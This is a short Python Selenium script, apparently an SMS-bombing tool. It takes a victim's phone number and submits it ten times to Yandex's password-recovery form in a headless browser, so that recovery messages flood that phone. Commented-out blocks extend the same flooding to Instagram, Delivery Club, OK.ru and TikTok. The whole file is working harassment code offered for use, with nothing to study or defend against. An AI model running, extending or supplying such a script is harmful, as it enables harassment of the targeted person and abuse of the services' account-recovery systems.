from selenium import webdriver
import time, os

print(os.getcwd())

logo = r'''
(c)StalkerVrk
'''

print(logo)

phoneNum = input('Номер телефона: ')

os.environ['EDGE_HEADLESS'] = '1'

browser = webdriver.Edge()

frequency = 10
for i in range(frequency):
    try:
        browser.get('https://passport.yandex.ru/auth/restore/login?origin=home_yandexid&retpath=https%3A%2F%2Fyandex.ru&backpath=https%3A%2F%2Fyandex.ru')

        number = browser.find_element_by_name('phone')
        number.send_keys(str(phoneNum))

        time.sleep(1)
        forgot = browser.find_element_by_tag_name('button')
        forgot.click()
        time.sleep(1)
    except:
        print("Error Yandex")
    
    # try:
    #     browser.get('https://www.instagram.com/accounts/password/reset/?hl=ru')

    #     number = browser.find_element_by_name('cppEmailOrUsername')
    #     number.send_keys(str(phoneNum))
    #     time.sleep(1)

    #     forgot = browser.find_element_by_tag_name('button')
    #     forgot.click()
    #     time.sleep(1)
    # except:
    #     print("Error Insta")

    # try:
    #     time.sleep(1)
    #     browser.get('https://www.delivery-club.ru/moscow?authPopupOpened=1')
    #     phoneNumForDeliveryClub = phoneNum[1:]
    #     number = browser.find_element_by_class_name('input--def')
    #     number.send_keys(str(phoneNumForDeliveryClub))
    # except:
    #     print("Error DeliveryClub")

    # try:
    #     browser.get('https://ok.ru/dk?st.cmd=anonymRecoveryStartPhoneLink')
    #     number = browser.find_element_by_name('st.r.phone')
    #     number.send_keys(str(phoneNum))
    #     time.sleep(1)
    #     forgot = browser.find_element_by_tag_name('submit')
    #     forgot.click()
    #     time.sleep(3)
    # except:
    #     print("Error GosUslugi")

    # try:
    #     browser.get('https://www.tiktok.com/')

    #     forgotOne = browser.find_element_by_link_text('button')
    #     forgotOne.click()

    #     forgotTwo = browser.find_element_by_link_text("Введите телефон / почту / имя пользователя")
    #     forgotTwo.click()
        
    #     number = browser.find_element_by_name('reg_email__')
    #     number.send_keys(str(phoneNum))

    #     # Ждем 1 секунду
    #     time.sleep(1)

    #     # Ищем кнопку на которую нужно нажать (она там всего одна :) )
    #     forgot = browser.find_element_by_tag_name('button')

    #     # Нажимаем на кнопку
    #     forgot.click()

    #     # Интервал между смс
    #     time.sleep(2)
    # except:
    #     print("Error TikTok")

# Закрываем браузер
browser.quit()